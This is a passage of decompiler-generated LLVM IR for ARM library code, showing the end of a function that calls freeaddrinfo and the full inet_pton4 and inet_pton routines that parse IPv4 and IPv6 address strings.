  %stack_var_-100.1.ph99 = phi i32 [ 0, %dec_label_pc_274a8.lr.ph.lr.ph ], [ %stack_var_-100.0, %dec_label_pc_275d4 ]
  %stack_var_-96.5.ph98 = phi i32 [ %stack_var_-96.1, %dec_label_pc_274a8.lr.ph.lr.ph ], [ %stack_var_-96.4, %dec_label_pc_275d4 ]
  %v0_275d83697 = phi i32 [ %v2_27494, %dec_label_pc_274a8.lr.ph.lr.ph ], [ %v1_275d4, %dec_label_pc_275d4 ]
  %v0_274a8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_274a8

dec_label_pc_275e4:                               ; preds = %.thread6, %bb73, %dec_label_pc_275d4
  %stack_var_-100.1.lcssa = phi i32 [ 0, %bb73 ], [ %stack_var_-100.0, %dec_label_pc_275d4 ], [ %v1_2753c, %.thread6 ]
  %v2_275e8 = icmp eq i32 %stack_var_-100.1.lcssa, 0
  br i1 %v2_275e8, label %bb76, label %dec_label_pc_275f4

bb76:                                             ; preds = %dec_label_pc_275e4
  store i32 -6, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2763c

dec_label_pc_275f4:                               ; preds = %dec_label_pc_275e4
  %v3_275f4 = load i32, i32* %stack_var_-44, align 4
  %v2_275f8 = icmp eq i32 %v3_275f4, 0
  %v2_27608.pr = load i32, i32* %stack_var_-104, align 4
  br i1 %v2_275f8, label %dec_label_pc_27608, label %.thread10.dec_label_pc_2763c_crit_edge

.thread10.dec_label_pc_2763c_crit_edge:           ; preds = %dec_label_pc_275f4
  %v3_27600 = inttoptr i32 %v2_27608.pr to i32*
  store i32 %v3_275f4, i32* %v3_27600, align 4
  %v1_27644.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2763c

dec_label_pc_27608:                               ; preds = %dec_label_pc_275f4
  %v2_2760c = icmp eq i32 %v2_27608.pr, 0
  %v1_27610 = load i32, i32* %fp.global-to-local, align 4
  %v3_27610 = icmp eq i32 %v1_27610, 0
  br i1 %v2_2760c, label %bb77, label %dec_label_pc_2761c

bb77:                                             ; preds = %dec_label_pc_27608
  br i1 %v3_27610, label %.thread13, label %dec_label_pc_2761c.thread

dec_label_pc_2761c.thread:                        ; preds = %bb77
  br label %dec_label_pc_27628

.thread13:                                        ; preds = %bb77
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2763c

dec_label_pc_2761c:                               ; preds = %dec_label_pc_27608
  br i1 %v3_27610, label %dec_label_pc_27630, label %dec_label_pc_27628

dec_label_pc_27628:                               ; preds = %dec_label_pc_2761c.thread, %dec_label_pc_2761c, %dec_label_pc_27598
  %storemerge.in = phi i32 [ %storemerge.in.pre, %dec_label_pc_27598 ], [ %v1_27610, %dec_label_pc_2761c ], [ %v1_27610, %dec_label_pc_2761c.thread ]
  %storemerge = and i32 %storemerge.in, -257
  %v1_27628 = sub i32 0, %storemerge
  store i32 %v1_27628, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2763c

dec_label_pc_27630:                               ; preds = %dec_label_pc_2744c, %dec_label_pc_2761c, %bb68
  store i32 -2, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2763c

dec_label_pc_27638:                               ; preds = %bb70, %dec_label_pc_273e8
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2763c

dec_label_pc_2763c:                               ; preds = %bb76, %.thread13, %.thread10.dec_label_pc_2763c_crit_edge, %dec_label_pc_27630, %dec_label_pc_27628, %dec_label_pc_27638
  %v1_27644 = phi i32 [ %v1_27644.pre, %.thread10.dec_label_pc_2763c_crit_edge ], [ 0, %.thread13 ], [ -6, %bb76 ], [ -2, %dec_label_pc_27630 ], [ %v1_27628, %dec_label_pc_27628 ], [ -1, %dec_label_pc_27638 ]
  store i32 %v3_27364, i32* @r4, align 4
  store i32 %v6_27364, i32* @r5, align 4
  store i32 %v9_27364, i32* @r6, align 4
  store i32 %v12_27364, i32* @r7, align 4
  store i32 %v15_27364, i32* @r8, align 4
  store i32 %v27_27364, i32* @lr, align 4
  ret i32 %v1_27644

; uselistorder directives
  uselistorder i32 %v1_27610, { 1, 0, 2 }
  uselistorder i32 %v2_27608.pr, { 1, 0 }
  uselistorder i32 %stack_var_-96.5.ph98, { 2, 3, 4, 5, 1, 0 }
  uselistorder i32 %v2_275c4, { 1, 0 }
  uselistorder i32 %v1_27590, { 0, 2, 1 }
  uselistorder i32 %v0_2757c, { 1, 0 }
  uselistorder i32 %v0_27558, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_2750c, { 1, 0, 2 }
  uselistorder i32 %v0_274d4, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v3_274d0, { 2, 3, 1, 0 }
  uselistorder i32 %v0_274a8, { 1, 0 }
  uselistorder i32 %v0_2740c, { 1, 0, 2, 3 }
  uselistorder i8** %stack_var_-48, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 17, 5, 16, 8, 6, 12, 7, 9, 11, 10, 13, 18, 14, 15, 0 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i32 (i32)* @freeaddrinfo, { 1, 0 }
  uselistorder label %dec_label_pc_2763c, { 5, 3, 4, 1, 2, 0 }
  uselistorder label %dec_label_pc_27630, { 1, 0, 2 }
  uselistorder label %dec_label_pc_27628, { 1, 0, 2 }
  uselistorder label %dec_label_pc_275e4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_274a8.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_275d4, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_275d0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_275b8, { 1, 0 }
  uselistorder label %dec_label_pc_27558, { 1, 0 }
  uselistorder label %dec_label_pc_27528, { 2, 1, 0 }
  uselistorder label %dec_label_pc_27524, { 2, 0, 1 }
  uselistorder label %bb73, { 1, 0 }
  uselistorder label %dec_label_pc_27474, { 0, 2, 1 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %dec_label_pc_273e8, { 1, 0 }
  uselistorder label %bb68, { 3, 2, 0, 1 }
  uselistorder label %thread-pre-split, { 2, 1, 0, 3 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_27650 = load i32, i32* @r4, align 4
  %v6_27650 = load i32, i32* @r5, align 4
  %v15_27650 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 0, i32* @ip, align 4
  store i32 0, i32* @lr, align 4
  %v2_27668 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_27668, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 10, i32* %r7.global-to-local, align 4
  store i32 1, i32* %r6.global-to-local, align 4
  store i32 0, i32* %stack_var_-28, align 4
  %v0_276e01 = load i32, i32* @r0, align 4
  %v1_276e02 = inttoptr i32 %v0_276e01 to i8*
  %v2_276e03 = load i8, i8* %v1_276e02, align 1
  %v3_276e04 = zext i8 %v2_276e03 to i32
  store i32 %v3_276e04, i32* @r3, align 4
  %v2_276e45 = icmp eq i8 %v2_276e03, 0
  store i1 %v2_276e45, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_276e45, label %dec_label_pc_276f0, label %dec_label_pc_27680

dec_label_pc_27680:                               ; preds = %entry, %dec_label_pc_276e0.backedge
  %v0_27684 = phi i32 [ %v0_276e0, %dec_label_pc_276e0.backedge ], [ %v0_276e01, %entry ]
  %v0_276bc = phi i32 [ %v3_276e0, %dec_label_pc_276e0.backedge ], [ %v3_276e04, %entry ]
  %v2_27690.in = phi i32 [ %v3_276e0, %dec_label_pc_276e0.backedge ], [ %v3_276e04, %entry ]
  %v2_27690 = add nsw i32 %v2_27690.in, -48
  %v2_27680 = icmp ugt i32 %v2_27690, 8
  %v7_27680 = icmp eq i32 %v2_27690, 9
  store i1 %v7_27680, i1* %cpsr_z.global-to-local, align 1
  %v1_27684 = add i32 %v0_27684, 1
  store i32 %v1_27684, i32* %r0.global-to-local, align 4
  %v2_27688 = xor i1 %v7_27680, true
  %v3_27688 = and i1 %v2_27680, %v2_27688
  br i1 %v3_27688, label %dec_label_pc_276bc, label %dec_label_pc_2768c

dec_label_pc_2768c:                               ; preds = %dec_label_pc_27680
  %v0_2768c = load i32, i32* %r1.global-to-local, align 4
  %v1_2768c = inttoptr i32 %v0_2768c to i8*
  %v2_2768c = load i8, i8* %v1_2768c, align 1
  %v3_2768c = zext i8 %v2_2768c to i32
  %v0_27690 = load i32, i32* %r7.global-to-local, align 4
  %v3_27690 = mul i32 %v0_27690, %v3_2768c
  %v4_27690 = add i32 %v3_27690, %v2_27690
  store i32 %v4_27690, i32* @r3, align 4
  %v2_27694 = icmp ugt i32 %v4_27690, 254
  %v7_27694 = icmp eq i32 %v4_27690, 255
  store i1 %v7_27694, i1* %cpsr_z.global-to-local, align 1
  %v2_27698 = xor i1 %v7_27694, true
  %v3_27698 = and i1 %v2_27694, %v2_27698
  br i1 %v3_27698, label %dec_label_pc_27714, label %dec_label_pc_2769c

dec_label_pc_2769c:                               ; preds = %dec_label_pc_2768c
  %v0_2769c = load i32, i32* @lr, align 4
  %v2_2769c = icmp eq i32 %v0_2769c, 0
  store i1 %v2_2769c, i1* %cpsr_z.global-to-local, align 1
  %v1_276a0 = trunc i32 %v4_27690 to i8
  store i8 %v1_276a0, i8* %v1_2768c, align 1
  %v0_276a4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_276a4, label %dec_label_pc_276a8, label %dec_label_pc_276e0.backedge

dec_label_pc_276a8:                               ; preds = %dec_label_pc_2769c
  %v0_276a8 = load i32, i32* @ip, align 4
  %v1_276a8 = add i32 %v0_276a8, 1
  store i32 %v1_276a8, i32* @ip, align 4
  %v7_276ac = icmp eq i32 %v1_276a8, 4
  store i1 %v7_276ac, i1* %cpsr_z.global-to-local, align 1
  %v0_276b0 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_276b0, i32* @lr, align 4
  %v8_276b4 = icmp sgt i32 %v1_276a8, 4
  br i1 %v8_276b4, label %dec_label_pc_27714, label %dec_label_pc_276e0.backedge

dec_label_pc_276bc:                               ; preds = %dec_label_pc_27680
  %v7_276bc = icmp eq i32 %v0_276bc, 46
  %v1_276c4 = load i32, i32* @lr, align 4
  %v2_276c4 = urem i32 %v1_276c4, 2
  %storemerge12 = select i1 %v7_276bc, i32 %v2_276c4, i32 0
  store i32 %storemerge12, i32* @r3, align 4
  %v2_276c8 = icmp eq i32 %storemerge12, 0
  store i1 %v2_276c8, i1* %cpsr_z.global-to-local, align 1
  %v0_276cc = load i32, i32* @r5, align 4
  store i32 %v0_276cc, i32* @lr, align 4
  br i1 %v2_276c8, label %dec_label_pc_27714, label %dec_label_pc_276d4

dec_label_pc_276d4:                               ; preds = %dec_label_pc_276bc
  %v0_276d4 = load i32, i32* @ip, align 4
  %v7_276d4 = icmp eq i32 %v0_276d4, 4
  store i1 %v7_276d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_276d4, label %dec_label_pc_27714, label %dec_label_pc_276dc

dec_label_pc_276dc:                               ; preds = %dec_label_pc_276d4
  %v1_276dc = trunc i32 %v0_276cc to i8
  %v2_276dc = load i32, i32* %r1.global-to-local, align 4
  %v3_276dc = add i32 %v2_276dc, 1
  %v4_276dc = inttoptr i32 %v3_276dc to i8*
  store i8 %v1_276dc, i8* %v4_276dc, align 1
  %v5_276dc = load i32, i32* %r1.global-to-local, align 4
  %v6_276dc = add i32 %v5_276dc, 1
  store i32 %v6_276dc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_276e0.backedge

dec_label_pc_276e0.backedge:                      ; preds = %dec_label_pc_276dc, %dec_label_pc_2769c, %dec_label_pc_276a8
  %v0_276e0 = load i32, i32* %r0.global-to-local, align 4
  %v1_276e0 = inttoptr i32 %v0_276e0 to i8*
  %v2_276e0 = load i8, i8* %v1_276e0, align 1
  %v3_276e0 = zext i8 %v2_276e0 to i32
  store i32 %v3_276e0, i32* @r3, align 4
  %v2_276e4 = icmp eq i8 %v2_276e0, 0
  store i1 %v2_276e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_276e4, label %dec_label_pc_276e0.dec_label_pc_276f0_crit_edge, label %dec_label_pc_27680

dec_label_pc_276e0.dec_label_pc_276f0_crit_edge:  ; preds = %dec_label_pc_276e0.backedge
  %v0_276f0.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_276f0

dec_label_pc_276f0:                               ; preds = %dec_label_pc_276e0.dec_label_pc_276f0_crit_edge, %entry
  %v0_276f0 = phi i32 [ %v0_276f0.pre, %dec_label_pc_276e0.dec_label_pc_276f0_crit_edge ], [ 0, %entry ]
  %v7_276f0 = icmp eq i32 %v0_276f0, 3
  store i1 %v7_276f0, i1* %cpsr_z.global-to-local, align 1
  %v7_276f4 = icmp slt i32 %v0_276f0, 4
  br i1 %v7_276f4, label %dec_label_pc_27714, label %dec_label_pc_276f8

dec_label_pc_276f8:                               ; preds = %dec_label_pc_276f0
  %v0_276f8 = load i32, i32* @r4, align 4
  store i32 %v0_276f8, i32* @r0, align 4
  store i32 %v2_27668, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_27704 = call i32 @memcpy()
  br label %dec_label_pc_27714

dec_label_pc_27714:                               ; preds = %dec_label_pc_2768c, %dec_label_pc_276a8, %dec_label_pc_276bc, %dec_label_pc_276d4, %dec_label_pc_276f0, %dec_label_pc_276f8
  %storemerge = phi i32 [ 1, %dec_label_pc_276f8 ], [ 0, %dec_label_pc_276f0 ], [ 0, %dec_label_pc_276d4 ], [ 0, %dec_label_pc_276bc ], [ 0, %dec_label_pc_276a8 ], [ 0, %dec_label_pc_2768c ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v3_27650, i32* @r4, align 4
  store i32 %v6_27650, i32* @r5, align 4
  store i32 %v15_27650, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_276f0, { 1, 0 }
  uselistorder i32 %v3_276e0, { 2, 1, 0 }
  uselistorder i32 %v0_276e0, { 1, 0 }
  uselistorder i32 %storemerge12, { 1, 0 }
  uselistorder i32 %v2_27690, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_27714, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_276e0.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_27680, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v3_27720 = load i32, i32* @r4, align 4
  %v6_27720 = load i32, i32* @r5, align 4
  %v9_27720 = load i32, i32* @r6, align 4
  %v12_27720 = load i32, i32* @r7, align 4
  %v27_27720 = load i32, i32* @lr, align 4
  %v7_2772c = icmp eq i32 %arg1, 2
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  br i1 %v7_2772c, label %dec_label_pc_2774c, label %dec_label_pc_27740

dec_label_pc_27740:                               ; preds = %entry
  %v7_27740 = icmp eq i32 %arg1, 10
  br i1 %v7_27740, label %dec_label_pc_2775c, label %dec_label_pc_27914

dec_label_pc_2774c:                               ; preds = %entry
  store i32 %tmp, i32* @r0, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  %v3_27754 = call i32 @inet_pton4(i32 %tmp, i32 %arg3)
  br label %dec_label_pc_27924

dec_label_pc_2775c:                               ; preds = %dec_label_pc_27740
  %v2_2775c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_2775c, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 16, i32* @r2, align 4
  %v0_27768 = call i32 @__GI_memset()
  %v0_2776c = load i32, i32* @r5, align 4
  %v1_2776c = inttoptr i32 %v0_2776c to i8*
  %v2_2776c = load i8, i8* %v1_2776c, align 1
  %v3_2776c = zext i8 %v2_2776c to i32
  store i32 %v3_2776c, i32* %r3.global-to-local, align 4
  %v7_27770 = icmp eq i8 %v2_2776c, 58
  store i32 %v0_27768, i32* @r6, align 4
  %v2_27778 = add i32 %v0_27768, 16
  store i32 %v2_27778, i32* %r8.global-to-local, align 4
  br i1 %v7_27770, label %dec_label_pc_27780, label %dec_label_pc_2778c

dec_label_pc_27780:                               ; preds = %dec_label_pc_2775c
  %v1_27780 = add i32 %v0_2776c, 1
  %v2_27780 = inttoptr i32 %v1_27780 to i8*
  %v3_27780 = load i8, i8* %v2_27780, align 1
  %v4_27780 = zext i8 %v3_27780 to i32
  store i32 %v4_27780, i32* %r3.global-to-local, align 4
  store i32 %v1_27780, i32* @r5, align 4
  %v7_27784 = icmp eq i8 %v3_27780, 58
  br i1 %v7_27784, label %dec_label_pc_2778c, label %dec_label_pc_2790c

dec_label_pc_2778c:                               ; preds = %dec_label_pc_27780, %dec_label_pc_2775c
  %v0_27798 = phi i32 [ %v1_27780, %dec_label_pc_27780 ], [ %v0_2776c, %dec_label_pc_2775c ]
  store i32 -36328, i32* @r3, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v0_27794 = load i32, i32* @r4, align 4
  %v2_27794 = add i32 %v0_27794, -36328
  store i32 %v0_27798, i32* %sl.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  store i32 %v2_27794, i32* %stack_var_-64, align 4
  %v1_278703 = inttoptr i32 %v0_27798 to i8*
  %v2_278704 = load i8, i8* %v1_278703, align 1
  %v3_278705 = zext i8 %v2_278704 to i32
  store i32 %v3_278705, i32* @r4, align 4
  %v2_278746 = icmp eq i8 %v2_278704, 0
  br i1 %v2_278746, label %dec_label_pc_2787c.thread, label %dec_label_pc_277ac

dec_label_pc_2787c.thread:                        ; preds = %dec_label_pc_2778c
  store i32 %v0_27768, i32* @r4, align 4
  br label %dec_label_pc_278a8

dec_label_pc_277ac:                               ; preds = %dec_label_pc_2778c, %dec_label_pc_27870.backedge.dec_label_pc_277ac_crit_edge
  %v0_277b0 = phi i32 [ %v3_27870, %dec_label_pc_27870.backedge.dec_label_pc_277ac_crit_edge ], [ %v3_278705, %dec_label_pc_2778c ]
  %v2_277ac = phi i32 [ %v2_277ac.pre, %dec_label_pc_27870.backedge.dec_label_pc_277ac_crit_edge ], [ %v2_27794, %dec_label_pc_2778c ]
  store i32 %v2_277ac, i32* @r0, align 4
  %v1_277b0 = or i32 %v0_277b0, 32
  store i32 %v1_277b0, i32* %r1.global-to-local, align 4
  %v2_277b4 = call i32 @__GI_strchr(i32 %v2_277ac, i32 %v1_277b0)
  %v2_277b8 = icmp eq i32 %v2_277b4, 0
  %v0_277bc = load i32, i32* @r5, align 4
  %v1_277bc = add i32 %v0_277bc, 1
  store i32 %v1_277bc, i32* @r5, align 4
  br i1 %v2_277b8, label %dec_label_pc_277e0, label %dec_label_pc_277c4

dec_label_pc_277c4:                               ; preds = %dec_label_pc_277ac
  %v2_277c4 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_277c4, i32* %r2.global-to-local, align 4
  %v2_277c8 = sub i32 %v2_277b4, %v2_277c4
  %v1_277cc = load i32, i32* @r7, align 4
  %v4_277cc = mul i32 %v1_277cc, 16
  %v5_277cc = or i32 %v4_277cc, %v2_277c8
  store i32 %v5_277cc, i32* @r7, align 4
  store i32 65535, i32* @r3, align 4
  %tmp36 = icmp ult i32 %v5_277cc, 65536
  br i1 %tmp36, label %dec_label_pc_2786c, label %dec_label_pc_2790c

dec_label_pc_277e0:                               ; preds = %dec_label_pc_277ac
  %v0_277e0 = load i32, i32* @r4, align 4
  %v7_277e0 = icmp eq i32 %v0_277e0, 58
  br i1 %v7_277e0, label %dec_label_pc_277e8, label %dec_label_pc_27840

dec_label_pc_277e8:                               ; preds = %dec_label_pc_277e0
  %v0_277e8 = load i32, i32* %sb.global-to-local, align 4
  %v2_277e8 = icmp eq i32 %v0_277e8, 0
  br i1 %v2_277e8, label %dec_label_pc_277f0, label %dec_label_pc_27804

dec_label_pc_277f0:                               ; preds = %dec_label_pc_277e8
  %v0_277f0 = load i32, i32* %fp.global-to-local, align 4
  %v2_277f0 = icmp eq i32 %v0_277f0, 0
  br i1 %v2_277f0, label %dec_label_pc_277f8, label %dec_label_pc_2790c

dec_label_pc_277f8:                               ; preds = %dec_label_pc_277f0
  %v0_277f8 = load i32, i32* @r6, align 4
  store i32 %v0_277f8, i32* %fp.global-to-local, align 4
  store i32 %v1_277bc, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_27870.backedge

dec_label_pc_27804:                               ; preds = %dec_label_pc_277e8
  %v1_27804 = inttoptr i32 %v1_277bc to i8*
  %v2_27804 = load i8, i8* %v1_27804, align 1
  %v3_27804 = zext i8 %v2_27804 to i32
  store i32 %v3_27804, i32* %r3.global-to-local, align 4
  %v2_27808 = icmp eq i8 %v2_27804, 0
  br i1 %v2_27808, label %dec_label_pc_2790c, label %dec_label_pc_27810

dec_label_pc_27810:                               ; preds = %dec_label_pc_27804
  %v0_27810 = load i32, i32* @r6, align 4
  %v1_27810 = add i32 %v0_27810, 2
  store i32 %v1_27810, i32* %r3.global-to-local, align 4
  %v1_27814 = load i32, i32* %r8.global-to-local, align 4
  %tmp37 = icmp ugt i32 %v1_27810, %v1_27814
  br i1 %tmp37, label %dec_label_pc_2790c, label %dec_label_pc_2781c

dec_label_pc_2781c:                               ; preds = %dec_label_pc_27810
  %v0_2781c = load i32, i32* @r7, align 4
  %v3_2781c = udiv i32 %v0_2781c, 256
  store i32 %v3_2781c, i32* %r2.global-to-local, align 4
  store i32 %v0_27810, i32* %r3.global-to-local, align 4
  %v1_27824 = trunc i32 %v3_2781c to i8
  %v3_27824 = inttoptr i32 %v0_27810 to i8*
  store i8 %v1_27824, i8* %v3_27824, align 1
  %v4_27824 = load i32, i32* %r3.global-to-local, align 4
  %v5_27824 = add i32 %v4_27824, 1
  store i32 %v5_27824, i32* @r3, align 4
  %v0_27828 = load i32, i32* @r7, align 4
  %v1_27828 = trunc i32 %v0_27828 to i8
  %v2_27828 = load i32, i32* @r6, align 4
  %v3_27828 = add i32 %v2_27828, 1
  %v4_27828 = inttoptr i32 %v3_27828 to i8*
  store i8 %v1_27828, i8* %v4_27828, align 1
  store i32 0, i32* @r7, align 4
  %v0_27830 = load i32, i32* @r3, align 4
  %v1_27830 = add i32 %v0_27830, 1
  store i32 %v1_27830, i32* @r6, align 4
  %v0_27834 = load i32, i32* @r5, align 4
  store i32 %v0_27834, i32* %sl.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_27870.backedge

dec_label_pc_27840:                               ; preds = %dec_label_pc_277e0
  %v7_27840 = icmp eq i32 %v0_277e0, 46
  br i1 %v7_27840, label %dec_label_pc_27848, label %dec_label_pc_2790c

dec_label_pc_27848:                               ; preds = %dec_label_pc_27840
  %v0_27848 = load i32, i32* @r6, align 4
  %v1_27848 = add i32 %v0_27848, 4
  store i32 %v1_27848, i32* @r4, align 4
  %v1_2784c = load i32, i32* %r8.global-to-local, align 4
  %tmp38 = icmp ugt i32 %v1_27848, %v1_2784c
  br i1 %tmp38, label %dec_label_pc_2790c, label %dec_label_pc_27854

dec_label_pc_27854:                               ; preds = %dec_label_pc_27848
  %v0_27854 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_27854, i32* @r0, align 4
  store i32 %v0_27848, i32* %r1.global-to-local, align 4
  %v3_2785c = call i32 @inet_pton4(i32 %v0_27854, i32 %v0_27848)
  %v5_27864 = icmp sgt i32 %v3_2785c, 0
  br i1 %v5_27864, label %dec_label_pc_27854.dec_label_pc_278a8_crit_edge, label %dec_label_pc_2790c

dec_label_pc_27854.dec_label_pc_278a8_crit_edge:  ; preds = %dec_label_pc_27854
  %v0_278ec.pre.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_278a8

dec_label_pc_2786c:                               ; preds = %dec_label_pc_277c4
  store i32 1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_27870.backedge

dec_label_pc_27870.backedge:                      ; preds = %dec_label_pc_2786c, %dec_label_pc_277f8, %dec_label_pc_2781c
  %v0_27870 = phi i32 [ %v1_277bc, %dec_label_pc_2786c ], [ %v1_277bc, %dec_label_pc_277f8 ], [ %v0_27834, %dec_label_pc_2781c ]
  %v0_2787c12 = phi i32 [ 1, %dec_label_pc_2786c ], [ 0, %dec_label_pc_277f8 ], [ 0, %dec_label_pc_2781c ]
  %v1_27870 = inttoptr i32 %v0_27870 to i8*
  %v2_27870 = load i8, i8* %v1_27870, align 1
  %v3_27870 = zext i8 %v2_27870 to i32
  store i32 %v3_27870, i32* @r4, align 4
  %v2_27874 = icmp eq i8 %v2_27870, 0
  br i1 %v2_27874, label %dec_label_pc_2787c, label %dec_label_pc_27870.backedge.dec_label_pc_277ac_crit_edge

dec_label_pc_27870.backedge.dec_label_pc_277ac_crit_edge: ; preds = %dec_label_pc_27870.backedge
  %v2_277ac.pre = load i32, i32* %stack_var_-64, align 4
  br label %dec_label_pc_277ac

dec_label_pc_2787c:                               ; preds = %dec_label_pc_27870.backedge
  %v0_27880.pre = load i32, i32* @r6, align 4
  %v2_2787c = icmp eq i32 %v0_2787c12, 0
  store i32 %v0_27880.pre, i32* @r4, align 4
  br i1 %v2_2787c, label %dec_label_pc_278a8, label %dec_label_pc_27888

dec_label_pc_27888:                               ; preds = %dec_label_pc_2787c
  %v1_27888 = add i32 %v0_27880.pre, 2
  store i32 %v1_27888, i32* %r3.global-to-local, align 4
  %v1_2788c = load i32, i32* %r8.global-to-local, align 4
  %tmp39 = icmp ugt i32 %v1_27888, %v1_2788c
  br i1 %tmp39, label %dec_label_pc_2790c, label %dec_label_pc_27894

dec_label_pc_27894:                               ; preds = %dec_label_pc_27888
  store i32 %v0_27880.pre, i32* %r3.global-to-local, align 4
  %v0_27898 = load i32, i32* @r7, align 4
  %v3_27898 = udiv i32 %v0_27898, 256
  store i32 %v3_27898, i32* %r2.global-to-local, align 4
  %v1_2789c = trunc i32 %v3_27898 to i8
  %v3_2789c = inttoptr i32 %v0_27880.pre to i8*
  store i8 %v1_2789c, i8* %v3_2789c, align 1
  %v4_2789c = load i32, i32* %r3.global-to-local, align 4
  %v5_2789c = add i32 %v4_2789c, 1
  store i32 %v5_2789c, i32* @r3, align 4
  %v0_278a0 = load i32, i32* @r7, align 4
  %v1_278a0 = trunc i32 %v0_278a0 to i8
  %v2_278a0 = load i32, i32* @r6, align 4
  %v3_278a0 = add i32 %v2_278a0, 1
  %v4_278a0 = inttoptr i32 %v3_278a0 to i8*
  store i8 %v1_278a0, i8* %v4_278a0, align 1
  %v0_278a4 = load i32, i32* @r3, align 4
  %v1_278a4 = add i32 %v0_278a4, 1
  store i32 %v1_278a4, i32* @r4, align 4
  br label %dec_label_pc_278a8

dec_label_pc_278a8:                               ; preds = %dec_label_pc_27854.dec_label_pc_278a8_crit_edge, %dec_label_pc_2787c.thread, %dec_label_pc_2787c, %dec_label_pc_27894
  %v0_278ec.pre = phi i32 [ %v0_278ec.pre.pre, %dec_label_pc_27854.dec_label_pc_278a8_crit_edge ], [ %v0_27768, %dec_label_pc_2787c.thread ], [ %v0_27880.pre, %dec_label_pc_2787c ], [ %v1_278a4, %dec_label_pc_27894 ]
  %v0_278a8 = load i32, i32* %fp.global-to-local, align 4
  %v2_278a8 = icmp eq i32 %v0_278a8, 0
  %v1_278ec.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_278a8, label %dec_label_pc_278ec, label %dec_label_pc_278b0

dec_label_pc_278b0:                               ; preds = %dec_label_pc_278a8
  %v9_278b0 = icmp eq i32 %v0_278ec.pre, %v1_278ec.pre
  %v2_278b4 = sub i32 %v0_278ec.pre, %v0_278a8
  store i32 %v2_278b4, i32* @ip, align 4
  br i1 %v9_278b0, label %dec_label_pc_2790c, label %dec_label_pc_278d4.preheader

dec_label_pc_278d4.preheader:                     ; preds = %dec_label_pc_278b0
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_278d4

dec_label_pc_278c8:                               ; preds = %dec_label_pc_278d4
  %v2_278dc = sub i32 %v0_278e8, %v0_278e0
  %v0_278c8 = load i32, i32* %fp.global-to-local, align 4
  %v2_278c8 = add i32 %v0_278c8, %v2_278d8
  %v3_278c8 = inttoptr i32 %v2_278c8 to i8*
  %v4_278c8 = load i8, i8* %v3_278c8, align 1
  %v6_278c8 = zext i8 %v4_278c8 to i32
  store i32 %v6_278c8, i32* @r3, align 4
